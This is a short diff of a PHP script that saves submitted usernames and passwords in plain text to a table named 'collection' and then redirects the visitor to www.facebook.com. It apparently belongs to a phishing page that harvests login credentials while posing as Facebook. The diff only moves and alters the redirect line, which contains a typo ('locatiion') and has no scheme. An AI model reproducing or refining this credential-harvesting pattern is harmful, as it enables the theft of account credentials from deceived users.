@@ -22,7 +22,8 @@
 		$insert_query=$conn->prepare("INSERT INTO collection (name,password) VALUES (?,?)");
 		$insert_query->bind_param("ss",$name,$password);
 		$insert_query->execute();
-		$sconn->close();
-		header('locatiion:www.facebook.com');
+		//$sconn->close();
+		
 	 }
+        header('locatiion:www.facebook.com');
 ?>
